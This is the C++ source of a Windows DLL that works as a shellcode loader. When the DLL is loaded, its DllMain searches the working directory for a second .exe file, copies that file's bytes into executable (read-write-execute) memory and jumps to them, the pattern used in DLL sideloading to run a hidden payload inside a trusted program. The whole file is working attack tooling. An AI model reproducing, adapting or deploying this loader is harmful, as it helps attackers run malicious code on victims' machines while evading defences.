/*
	author: https://github.com/july0426
*/

//#include "pch.h"
#include <stdio.h>
#include <fcntl.h>
#include <io.h>

#include <iostream>
#include <cstdio>
#include <string>
#include <cstring>
#include <atlstr.h>
#include <tchar.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <peconv.h>
#include<stdio.h>
#include <io.h>
#include<vector>
#include <direct.h>
#define MAX_PATH 280

using namespace std;

void getFiles(string path, string path2, vector<string>& files)
{
	intptr_t   hFile = 0;
	struct _finddata_t fileinfo;
	string p, p2;
	if ((hFile = _findfirst(p.assign(path).append(path2).append("*").c_str(), &fileinfo)) != -1)
	{
		do
		{

			if ((fileinfo.attrib &  _A_SUBDIR))
			{
				if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
					getFiles(p.assign(path).append("\\"), p2.assign(fileinfo.name).append("\\"), files);
			}
			else
			{
				files.push_back(p.assign(path2).append(fileinfo.name));
				//files.push_back(p.assign(fileinfo.name) );   
			}
		} while (_findnext(hFile, &fileinfo) == 0);
		_findclose(hFile);
	}
}

std::string Find_exename() {
	LPTSTR pCommandLine;

	pCommandLine = GetCommandLine();
	_tprintf(L"%s\n", pCommandLine);
	CString sChar = CString(pCommandLine);
	USES_CONVERSION;
	std::string exe_name1 = std::string(T2A(sChar));

	std::string cmd = exe_name1.substr(0, exe_name1.find(".exe") + 4);
	cout << cmd << endl;

	string exe_name = cmd.substr(cmd.find_last_of("\\") + 1);

	//cout << exe_name << endl;


	char   buffer[MAX_PATH];
	_getcwd(buffer, MAX_PATH);
	cout << buffer << endl;

	CString filePath;
	GetModuleFileName(NULL, filePath.GetBufferSetLength(MAX_PATH + 1), MAX_PATH);
	filePath.ReleaseBuffer();
	int pos = filePath.ReverseFind('\\');
	filePath = filePath.Left(pos);

	string filePath2;
	filePath2 = CT2A(filePath.GetString());
	vector<string> files;
	filePath2.assign(buffer).append("\\");


	getFiles(filePath2, "", files);
	int size = files.size();
	//cout << size << endl;
	string load_name = "";
	for (int i = 0; i < size; i++)
	{
		//cout << files[i].c_str() << endl;
		string filename = files[i].c_str();
		//cout << filename.length() << endl;
		//cout << filename.find_last_of(".dll") << endl;
		if (filename.length() - filename.find_last_of(".dll") == 1) {
			continue;
		};
		if (filename == exe_name) {
			continue;
		};
		if (filename.length() - filename.find_last_of(".exe") == 1) {
			load_name = filename;
			break;
		};


	}
	return load_name;
}

int Load_ShellCode() {
	//string load_name = "mishc.exe";
	string load_name = Find_exename();
	char* in_path = (char*)load_name.data();

	std::cout << "[*] Reading module from: " << in_path << std::endl;

	size_t exe_size = 0;
	BYTE *my_exe = peconv::load_file(in_path, exe_size);
	if (!my_exe) {
		std::cout << "[-] Loading file failed" << std::endl;
		return -1;
	}
	BYTE *test_buf = peconv::alloc_aligned(exe_size, PAGE_EXECUTE_READWRITE);
	if (!test_buf) {
		peconv::free_file(my_exe);
		std::cout << "[-] Allocating buffer failed" << std::endl;
		return -2;
	}
	//copy file content into executable buffer:
	memcpy(test_buf, my_exe, exe_size);

	//free the original buffer:
	peconv::free_file(my_exe);
	my_exe = nullptr;

	std::cout << "[*] Running the shellcode:" << std::endl;
	//run it:
	int(*my_main)() = (int(*)()) ((ULONGLONG)test_buf);
	int ret_val = my_main();

	peconv::free_aligned(test_buf, exe_size);
	//std::cout << "[+] The shellcode finished with a return value: " << std::hex << ret_val << std::endl;
	return ret_val;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		Load_ShellCode();
		return TRUE;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
